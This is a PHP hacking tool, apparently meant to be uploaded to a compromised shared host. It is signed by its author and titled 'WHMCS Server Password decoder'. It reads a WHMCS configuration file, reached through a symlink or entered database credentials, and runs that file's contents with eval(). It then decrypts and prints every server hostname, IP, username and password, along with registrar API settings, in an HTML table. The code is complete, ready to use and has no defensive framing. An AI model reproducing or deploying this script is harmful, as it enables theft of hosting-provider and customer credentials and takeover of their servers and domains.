<?php
 
###########################################
#      WHMCS Server Password decoder       #
#      Coded By BLACK BURN                 #
#          dj.moonlit@gmail.com            #
#Note : I'm Proud to be Bangladeshi        #  
###########################################
 
 
 
function decrypt ($string,$cc_encryption_hash)
{
 
        $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
        $hash_key = _hash ($key);
        $hash_length = strlen ($hash_key);
        $string = base64_decode ($string);
        $tmp_iv = substr ($string, 0, $hash_length);
        $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
        $iv = $out = '';
        $c = 0;
        while ($c < $hash_length)
        {
                $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
                ++$c;
        }
 
        $key = $iv;
        $c = 0;
        while ($c < strlen ($string))
        {
                if (($c != 0 AND $c % $hash_length == 0))
                {
                        $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
                }
 
                $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
                ++$c;
        }
 
        return $out;
}
 
 
function _hash ($string)
{
        if (function_exists ('sha1'))
        {
                $hash = sha1 ($string);
        }
        else
        {
                $hash = md5 ($string);
        }
 
        $out = '';
        $c = 0;
        while ($c < strlen ($hash))
        {
                $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
                $c += 2;
        }
 
        return $out;
}
 
 if($_POST['form_action'] == 1 )
 {
 //include($file);
 
 $file=($_POST['file']);
$text=file_get_contents($file);
 
$text= str_replace("<?php", "", $text);
$text= str_replace("<?", "", $text);
$text= str_replace("?>", "", $text);
 
eval($text);
 
    $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
 
$query = mysql_query("SELECT * FROM tblservers");
 
while($v = mysql_fetch_array($query)) {
 
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
 
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");
 
 
echo "</table><br><br></center>";
 
}
 
    $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
 
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
 
$registrar      = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
 
 
 
 
 
}
echo "</table><br><br></center>";
}
 
 
 
 if($_POST['form_action'] == 2 )
 {
 //include($file);
 
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);
 
 
 
 
    $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
 
$query = mysql_query("SELECT * FROM tblservers");
 
while($v = mysql_fetch_array($query)) {
 
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
 
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");
 
 
echo "</table><br><br></center>";
 
}
 
 
    $link=mysql_connect($db_host,$db_username,$db_password) ;
            mysql_select_db($db_name,$link) ;
 
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
 
$registrar      = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
 
 
 
 
 
}
echo "</table><br><br></center>";
}
 
 
 
 
?><body bgcolor="#000000">
 <style>
 
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: olive;   color: white;}
textarea{background-color:#191919;color:red;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1px solid #666666;}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 13px;font-weight:bold;color: red; font-family: Tahoma; border: 1px solid #666666;height:17}
</style>
<center>
<font color="#FFFF6FF" size='+3'>[ ~~ WHMCS Server Password decoder ~~ ]</font><br><br>
<font color="#0066FF" size='+2'>Symlink to configuration.php of WHMCS</font><br>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="1">
<br>
 <input type="text" size="30" name="file" value="">
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>
 
<br>
<center>
<font color="#0066FF" size='+2'>DB configuration of WHMCS</font><br>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="2">
<br>
<table border=1>
 
<tr><td>db_host </td><td><input type="text" size="30" name="db_host" value="localhost"></td></tr>
<tr><td>db_username </td><td><input type="text" size="30" name="db_username" value=""></td></tr>
<tr><td>db_password</td><td><input type="text" size="30" name="db_password" value=""></td></tr>
<tr><td>db_name</td><td><input type="text" size="30" name="db_name" value=""><td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr>
 
</table>
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>
<center>
<font color="#0066FF" size='+2'>Password decoder</font><br>
<?
 if($_POST['form_action'] == 3 )
 {
 
 
 
 $password=($_POST['password']);
 
 $cc_encryption_hash=($_POST['cc_encryption_hash']);
 
 
$password = decrypt ($password, $cc_encryption_hash);
 
echo("Password is ".$password);
 
}
?>
</center>
<FORM action=""  method="post">
<input type="hidden" name="form_action" value="3">
<br>
<table border=1>
 
<tr><td>Password</td><td><input type="text" size="30" name="password" value=""></td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text" size="30" name="cc_encryption_hash" value=""></td></tr>
 
</table>
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>
<hr>
 
 
